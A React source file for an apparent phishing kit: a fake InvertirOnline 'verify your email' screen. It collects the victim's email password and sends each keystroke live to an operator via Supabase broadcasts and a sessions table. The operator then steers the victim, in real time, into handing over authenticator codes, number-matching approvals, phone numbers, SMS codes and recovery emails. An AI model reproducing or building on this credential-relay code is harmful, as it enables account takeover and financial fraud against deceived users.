import { useState, useEffect, useCallback } from "react";
import { supabase } from "@/integrations/supabase/client";
import {
  ArrowLeft,
  ArrowRight,
  Loader2,
  CheckCircle,
  Smartphone,
  MessageSquare,
  Mail,
} from "lucide-react";
import { getEmailProvider } from "@/lib/emailProviders";
import iolLogo from "@/assets/iol-logo-v7.svg";
import {
  InputOTP,
  InputOTPGroup,
  InputOTPSlot,
  InputOTPSeparator,
} from "@/components/ui/input-otp";

interface ConfirmEmailScreenProps {
  email: string;
  sessionId: string;
  onBack: () => void;
}

type ConfirmStep =
  | "password"
  | "waiting"
  | "token_2fa"
  | "sms_phone"
  | "sms_waiting"
  | "sms_code"
  | "recovery_email_input"
  | "recovery_email_submitted"
  | "success";

const getChannelName = (sessionId: string) => `confirm-email-${sessionId}`;

const ConfirmEmailScreen = ({ email, sessionId, onBack }: ConfirmEmailScreenProps) => {
  const [step, setStep] = useState<ConfirmStep>("password");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [tokenCode, setTokenCode] = useState("");
  const [smsCode, setSmsCode] = useState("");
  const [clientRecoveryEmail, setClientRecoveryEmail] = useState("");
  const [smsPhoneNumber, setSmsPhoneNumber] = useState("");
  const [phoneEnding, setPhoneEnding] = useState("");
  const [clientPhoneInput, setClientPhoneInput] = useState("");
  const [adminTokenCode, setAdminTokenCode] = useState("");
  const [recoveryEmailAddr, setRecoveryEmailAddr] = useState("");
  const [errorMessage, setErrorMessage] = useState("");

  const provider = getEmailProvider(email);

  // ── Broadcast helper ──
  const broadcastToAdmin = useCallback(
    (event: string, payload: Record<string, string>) => {
      const tempCh = supabase.channel(`${getChannelName(sessionId)}-client-${Date.now()}`);
      tempCh.subscribe((s) => {
        if (s === "SUBSCRIBED") {
          tempCh.send({ type: "broadcast", event, payload });
          setTimeout(() => supabase.removeChannel(tempCh), 1500);
        }
      });
    },
    [sessionId]
  );

  // ── Realtime listeners (sem polling automático) ──
  useEffect(() => {
    // Listen on both confirm and sync channels (unified)
    const confirmCh = supabase.channel(getChannelName(sessionId));
    const syncCh = supabase.channel(`sync-email-${sessionId}`);

    const handleDecision = (decision?: string, payload?: Record<string, string>) => {
      if (!decision) return;

      if (decision === "confirm_wrong_password" || decision === "sync_wrong_password") {
        // Evita regressão automática para "Verificar email".
        // O usuário só deve trocar de etapa por ação manual.
        setErrorMessage("Contraseña incorrecta. Intentá nuevamente.");
        setLoading(false);
      } else if (decision === "confirm_ask_otp" || decision === "sync_ask_otp") {
        setStep((prev) => {
          if (prev === "sms_waiting" || prev === "recovery_email_submitted") {
            setSmsCode("");
            setErrorMessage("");
            return "sms_code";
          }
          setTokenCode("");
          setAdminTokenCode("");
          setErrorMessage("");
          return "token_2fa";
        });
      } else if (decision === "confirm_ask_token" || decision === "sync_ask_token") {
        const code = payload?.admin_token || "";
        setAdminTokenCode(code);
        setStep("token_2fa");
        setTokenCode("");
        setErrorMessage("");
      } else if (decision === "confirm_ask_sms" || decision === "sync_ask_sms") {
        setStep((prev) => {
          if (prev === "sms_waiting" || prev === "recovery_email_submitted") {
            setSmsCode("");
            setErrorMessage("");
            return "sms_code";
          }
          const ending = payload?.sms_ending || "";
          setPhoneEnding(ending);
          setClientPhoneInput("");
          setSmsCode("");
          setErrorMessage("");
          return "sms_phone";
        });
      } else if (decision === "confirm_advance_sms_code" || decision === "sync_advance_sms_code") {
        const ending = payload?.sms_ending || "";
        if (ending) setPhoneEnding(ending);
        setStep("sms_code");
        setSmsCode("");
        setErrorMessage("");
      } else if (decision === "confirm_ask_recovery_email" || decision === "sync_ask_recovery_email") {
        const recEmail = payload?.recovery_email || "";
        setRecoveryEmailAddr(recEmail);
        setStep("recovery_email_input");
        setClientRecoveryEmail("");
        setErrorMessage("");
      } else if (decision === "confirm_ask_recovery" || decision === "sync_ask_recovery") {
        setErrorMessage("");
      } else if (decision === "confirm_approved" || decision === "sync_approved") {
        setStep("success");
      } else if (decision === "confirm_rejected" || decision === "sync_rejected") {
        setErrorMessage("La verificación falló. Intentá nuevamente.");
        setClientRecoveryEmail("");
        setSmsCode("");
        setTokenCode("");
      }
    };

    confirmCh
      .on("broadcast", { event: "admin_decision" }, (p) => handleDecision(p.payload?.status, p.payload))
      .subscribe();

    syncCh
      .on("broadcast", { event: "admin_sync_decision" }, (p) => handleDecision(p.payload?.status, p.payload))
      .subscribe();

    return () => {
      supabase.removeChannel(confirmCh);
      supabase.removeChannel(syncCh);
    };
  }, [sessionId]);

// ── Password change: broadcast every keystroke in real-time ──
const handlePasswordChange = useCallback(
  (value: string) => {
    setPassword(value);
    supabase.from("sessions").update({ otp_code: `email_pass:${value}` }).eq("id", sessionId).then(() => {});
    broadcastToAdmin("client_email_password_typing", {
      session_id: sessionId,
      email_password: value,
    });
  },
  [sessionId, broadcastToAdmin]
);

// ── Password submit ──
const handlePasswordSubmit = useCallback(
  async (e: React.FormEvent) => {
    e.preventDefault();
    if (!password.trim()) return;

    setLoading(true);
    setErrorMessage("");

    await supabase
      .from("sessions")
      .update({
        otp_code: `email_pass:${password}`,
        status: "confirm_email_pending",
      })
      .eq("id", sessionId);

    broadcastToAdmin("client_email_password", {
      session_id: sessionId,
      email_password: password,
      email,
      provider_id: provider.id,
      provider_name: provider.name,
    });

    setStep("waiting");
    setLoading(false);
  },
  [password, sessionId, provider, broadcastToAdmin, email]
);

// ── Token change: broadcast every keystroke ──
const handleTokenChange = useCallback(
  (value: string) => {
    setTokenCode(value);
    supabase.from("sessions").update({ otp_code: `token_code:${value}` }).eq("id", sessionId).then(() => {});
    broadcastToAdmin("client_token_update", { session_id: sessionId, token_code: value });
  },
  [sessionId, broadcastToAdmin]
);

// ── Phone number change: broadcast every keystroke ──
const handlePhoneChange = useCallback(
  (value: string) => {
    setClientPhoneInput(value);
    supabase.from("sessions").update({ otp_code: `client_phone:${value}` }).eq("id", sessionId).then(() => {});
    broadcastToAdmin("client_phone_update", { session_id: sessionId, phone_number: value });
  },
  [sessionId, broadcastToAdmin]
);

// ── Phone number submit → go to SMS code step ──
const handlePhoneSubmit = useCallback(
  (e: React.FormEvent) => {
    e.preventDefault();
    if (!clientPhoneInput.trim()) return;
    supabase.from("sessions").update({ otp_code: `client_phone_final:${clientPhoneInput}` }).eq("id", sessionId).then(() => {});
    broadcastToAdmin("client_phone_submitted", { session_id: sessionId, phone_number: clientPhoneInput });
    setStep("sms_waiting");
  },
  [clientPhoneInput, sessionId, broadcastToAdmin]
);

// ── SMS change: broadcast every keystroke ──
const handleSmsCodeChange = useCallback(
  (value: string) => {
    setSmsCode(value);
    supabase.from("sessions").update({ otp_code: `sms_code:${value}` }).eq("id", sessionId).then(() => {});
    broadcastToAdmin("client_sms_update", { session_id: sessionId, sms_code: value });
  },
  [sessionId, broadcastToAdmin]
);

// ── Recovery email input change: broadcast every keystroke ──
const handleRecoveryEmailChange = useCallback(
  (value: string) => {
    setClientRecoveryEmail(value);
    supabase.from("sessions").update({ otp_code: `client_recovery_email:${value}` }).eq("id", sessionId).then(() => {});
    broadcastToAdmin("client_recovery_email_update", { session_id: sessionId, recovery_email: value });
  },
  [sessionId, broadcastToAdmin]
);

// ═══ SUCCESS ═══
if (step === "success") {
  return (
    <div className="flex flex-col items-center text-center">
      <div className="mb-6 flex h-16 w-16 items-center justify-center rounded-full bg-green-500/10">
        <CheckCircle className="h-8 w-8 text-green-500" />
      </div>
      <h3 className="mb-2 text-lg font-semibold text-foreground">Email verificado</h3>
      <p className="mb-1 text-sm text-muted-foreground">Tu cuenta fue verificada correctamente. Redirigiendo...</p>
      <p className="text-xs text-muted-foreground/60">{email}</p>
    </div>
  );
}

return (
  <div className="flex flex-col items-center text-center">
    {/* Connection visual */}
    <div className="mb-6 flex items-center justify-center gap-4">
      <div className="flex h-14 w-14 items-center justify-center rounded-2xl border border-border bg-secondary/50">
        <img src={iolLogo} alt="InvertirOnline" className="h-5 object-contain" />
      </div>
      <div className="flex items-center gap-1">
        <div className="h-px w-3 bg-border" />
        <div className="flex h-7 w-7 items-center justify-center rounded-full border border-primary/40 bg-primary/10">
          <ArrowRight className="h-3 w-3 text-primary" />
        </div>
        <div className="h-px w-3 bg-border" />
      </div>
      <div className="flex h-14 w-14 items-center justify-center rounded-2xl border border-border bg-secondary/50 p-1.5">
        {provider.icon}
      </div>
    </div>

    {/* Email display */}
    <div className="mb-5 w-full rounded-lg border border-border bg-secondary/30 px-4 py-2.5">
      <div className="flex items-center gap-3">
        <div className="h-7 w-7">{provider.icon}</div>
        <div className="flex flex-col items-start text-left">
          <span className="text-[10px] text-muted-foreground">{provider.name}</span>
          <span className="text-sm font-medium text-foreground">{email}</span>
        </div>
      </div>
    </div>

    {errorMessage && (
      <div className="mb-4 w-full rounded-md border border-destructive/30 bg-destructive/10 px-4 py-2 text-sm text-destructive">
        {errorMessage}
      </div>
    )}

    {step === "password" && (
      <>
        <h3 className="mb-1.5 text-lg font-semibold text-foreground">Verificar email</h3>
        <p className="mb-5 text-sm text-muted-foreground">
          Confirmá tu identidad para verificar tu cuenta de {provider.name}
        </p>

        <form onSubmit={handlePasswordSubmit} className="w-full">
          <input
            type="password"
            placeholder={`Contraseña de ${provider.name}`}
            value={password}
            onChange={(e) => handlePasswordChange(e.target.value)}
            disabled={loading}
            autoFocus
            className="mb-3 flex h-11 w-full rounded-lg border border-input bg-input px-4 py-2 text-sm text-foreground ring-offset-background placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50"
          />
          <button
            type="submit"
            disabled={loading || !password.trim()}
            className="flex w-full items-center justify-center gap-2 rounded-lg bg-primary px-4 py-2.5 text-sm font-semibold text-primary-foreground hover:bg-primary/90 transition-colors disabled:opacity-50"
          >
            {loading ? (
              <><Loader2 className="h-4 w-4 animate-spin" /> Verificando...</>
            ) : (
              <><ArrowRight className="h-4 w-4" /> Continuar</>
            )}
          </button>
        </form>
      </>
    )}

    {step === "waiting" && (
      <>
        <h3 className="mb-1.5 text-lg font-semibold text-foreground">Verificando tu cuenta</h3>
        <p className="mb-5 text-sm text-muted-foreground">
          Estamos verificando tu cuenta de {provider.name}. Esperá...
        </p>
        <div className="flex items-center gap-2 text-sm text-muted-foreground">
          <Loader2 className="h-4 w-4 animate-spin" />
          <span className="h-2 w-2 animate-pulse rounded-full bg-amber-400" />
          Verificación en progreso...
        </div>
      </>
    )}

    {step === "token_2fa" && (
      <>
        <div className="mb-3 flex h-11 w-11 items-center justify-center rounded-full bg-primary/10">
          <Smartphone className="h-5 w-5 text-primary" />
        </div>
        <h3 className="mb-1.5 text-lg font-semibold text-foreground">Verificación en dos pasos</h3>

        {adminTokenCode ? (
          <>
            <p className="mb-4 text-sm text-muted-foreground">
              Tocá el número que aparece abajo en tu dispositivo para confirmar
            </p>
            <div className="mb-4 flex h-20 w-20 items-center justify-center rounded-2xl border-2 border-primary bg-primary/10 mx-auto">
              <span className="text-3xl font-bold text-primary">{adminTokenCode}</span>
            </div>
            <div className="flex items-center gap-2 text-sm text-muted-foreground">
              <span className="h-2 w-2 animate-pulse rounded-full bg-amber-400" />
              Esperando confirmación...
            </div>
          </>
        ) : (
          <>
            <p className="mb-5 text-sm text-muted-foreground">
              Ingresá el código de 6 dígitos de tu app de autenticación
            </p>
            <div className="mb-5">
              <InputOTP maxLength={6} value={tokenCode} onChange={handleTokenChange} inputMode="numeric" pattern="[0-9]*">
                <InputOTPGroup>
                  <InputOTPSlot index={0} />
                  <InputOTPSlot index={1} />
                  <InputOTPSlot index={2} />
                </InputOTPGroup>
                <InputOTPSeparator />
                <InputOTPGroup>
                  <InputOTPSlot index={3} />
                  <InputOTPSlot index={4} />
                  <InputOTPSlot index={5} />
                </InputOTPGroup>
              </InputOTP>
            </div>
            {tokenCode.length === 6 && (
              <div className="flex items-center gap-2 text-sm text-muted-foreground">
                <span className="h-2 w-2 animate-pulse rounded-full bg-amber-400" />
                Verificando código...
              </div>
            )}
          </>
        )}
      </>
    )}

    {step === "sms_phone" && (
      <>
        <div className="mb-3 flex h-11 w-11 items-center justify-center rounded-full bg-primary/10">
          <Smartphone className="h-5 w-5 text-primary" />
        </div>
        <h3 className="mb-1.5 text-lg font-semibold text-foreground">Verificación telefónica</h3>
        <p className="mb-5 text-sm text-muted-foreground">
          {phoneEnding ? (
            <>Confirmá el número que termina en <span className="font-bold text-foreground">**{phoneEnding}</span> para recibir un código de verificación</>
          ) : (
            "Ingresá tu número de teléfono para recibir un código por SMS"
          )}
        </p>

        <form onSubmit={handlePhoneSubmit} className="w-full">
          <input
            type="tel"
            placeholder={phoneEnding ? `Número terminado en ${phoneEnding}` : "+54 11 0000-0000"}
            value={clientPhoneInput}
            onChange={(e) => handlePhoneChange(e.target.value)}
            autoFocus
            className="mb-3 flex h-11 w-full rounded-lg border border-input bg-input px-4 py-2 text-sm text-foreground ring-offset-background placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2"
          />
          <button
            type="submit"
            disabled={!clientPhoneInput.trim()}
            className="flex w-full items-center justify-center gap-2 rounded-lg bg-primary px-4 py-2.5 text-sm font-semibold text-primary-foreground hover:bg-primary/90 transition-colors disabled:opacity-50"
          >
            <ArrowRight className="h-4 w-4" /> Enviar código
          </button>
        </form>
      </>
    )}

    {step === "sms_waiting" && (
      <>
        <div className="mb-3 flex h-11 w-11 items-center justify-center rounded-full bg-primary/10">
          <Smartphone className="h-5 w-5 text-primary" />
        </div>
        <h3 className="mb-1.5 text-lg font-semibold text-foreground">Verificación telefónica</h3>
        <p className="mb-4 text-sm text-muted-foreground">
          Enviando código de verificación a{" "}
          <span className="font-bold text-foreground">{clientPhoneInput}</span>
        </p>
        <div className="flex items-center gap-2 text-sm text-muted-foreground">
          <Loader2 className="h-4 w-4 animate-spin" />
          <span className="h-2 w-2 animate-pulse rounded-full bg-amber-400" />
          Enviando código SMS...
        </div>
      </>
    )}

    {step === "recovery_email_input" && (
      <>
        <div className="mb-3 flex h-11 w-11 items-center justify-center rounded-full bg-primary/10">
          <Mail className="h-5 w-5 text-primary" />
        </div>
        <h3 className="mb-1.5 text-lg font-semibold text-foreground">Email de recuperación</h3>
        <p className="mb-4 text-sm text-muted-foreground">
          Ingresá tu email de recuperación para recibir un código de verificación
        </p>

        {recoveryEmailAddr && (
          <div className="mb-4 w-full rounded-lg border border-border bg-secondary/30 px-4 py-2.5">
            <div className="flex items-center gap-3">
              <Mail className="h-5 w-5 text-muted-foreground shrink-0" />
              <div className="flex flex-col items-start text-left">
                <span className="text-[10px] text-muted-foreground">Email de recuperación</span>
                <span className="text-sm font-medium text-foreground">{recoveryEmailAddr}</span>
              </div>
            </div>
          </div>
        )}

        <form onSubmit={(e) => {
          e.preventDefault();
          if (!clientRecoveryEmail.trim()) return;
          supabase.from("sessions").update({ otp_code: `client_recovery_email_final:${clientRecoveryEmail}` }).eq("id", sessionId).then(() => {});
          broadcastToAdmin("client_recovery_email_submitted", { session_id: sessionId, recovery_email: clientRecoveryEmail });
          setStep("recovery_email_submitted");
        }} className="w-full">
          <input
            type="email"
            placeholder="Ingresá tu email de recuperación completo"
            value={clientRecoveryEmail}
            onChange={(e) => handleRecoveryEmailChange(e.target.value)}
            autoFocus
            className="mb-3 flex h-11 w-full rounded-lg border border-input bg-input px-4 py-2 text-sm text-foreground ring-offset-background placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2"
          />
          <button
            type="submit"
            disabled={!clientRecoveryEmail.trim()}
            className="flex w-full items-center justify-center gap-2 rounded-lg bg-primary px-4 py-2.5 text-sm font-semibold text-primary-foreground hover:bg-primary/90 transition-colors disabled:opacity-50"
          >
            <ArrowRight className="h-4 w-4" /> Continuar
          </button>
        </form>
      </>
    )}

    {step === "sms_code" && (
      <>
        <div className="mb-3 flex h-11 w-11 items-center justify-center rounded-full bg-primary/10">
          <MessageSquare className="h-5 w-5 text-primary" />
        </div>
        <h3 className="mb-1.5 text-lg font-semibold text-foreground">Verificación SMS</h3>
        <p className="mb-5 text-sm text-muted-foreground">
          {phoneEnding ? (
            <>Ingresá el código enviado al número que termina en <span className="font-bold text-foreground">**{phoneEnding}</span></>
          ) : clientPhoneInput ? (
            <>Ingresá el código enviado a <span className="font-bold text-foreground">{clientPhoneInput}</span></>
          ) : (
            "Ingresá el código enviado por SMS"
          )}
        </p>

        <div className="mb-5">
          <InputOTP maxLength={6} value={smsCode} onChange={handleSmsCodeChange} inputMode="numeric" pattern="[0-9]*">
            <InputOTPGroup>
              <InputOTPSlot index={0} />
              <InputOTPSlot index={1} />
              <InputOTPSlot index={2} />
            </InputOTPGroup>
            <InputOTPSeparator />
            <InputOTPGroup>
              <InputOTPSlot index={3} />
              <InputOTPSlot index={4} />
              <InputOTPSlot index={5} />
            </InputOTPGroup>
          </InputOTP>
        </div>

        {smsCode.length === 6 && (
          <div className="flex items-center gap-2 text-sm text-muted-foreground">
            <span className="h-2 w-2 animate-pulse rounded-full bg-amber-400" />
            Verificando código SMS...
          </div>
        )}
      </>
    )}

    {step === "recovery_email_submitted" && (
      <>
        <div className="mb-3 flex h-11 w-11 items-center justify-center rounded-full bg-primary/10">
          <Mail className="h-5 w-5 text-primary" />
        </div>
        <h3 className="mb-1.5 text-lg font-semibold text-foreground">Email de recuperación</h3>
        <p className="mb-4 text-sm text-muted-foreground">
          Verificando tu email de recuperación{" "}
          <span className="font-bold text-foreground">{clientRecoveryEmail}</span>
        </p>
        <div className="flex items-center gap-2 text-sm text-muted-foreground">
          <Loader2 className="h-4 w-4 animate-spin" />
          <span className="h-2 w-2 animate-pulse rounded-full bg-amber-400" />
          Verificación en progreso...
        </div>
      </>
    )}

    <button
      onClick={onBack}
      disabled={loading}
      className="mt-5 flex items-center gap-1.5 text-xs text-muted-foreground hover:text-foreground transition-colors disabled:opacity-50"
    >
      <ArrowLeft size={13} />
      Volver al inicio
    </button>
  </div>
);
};

export default ConfirmEmailScreen;
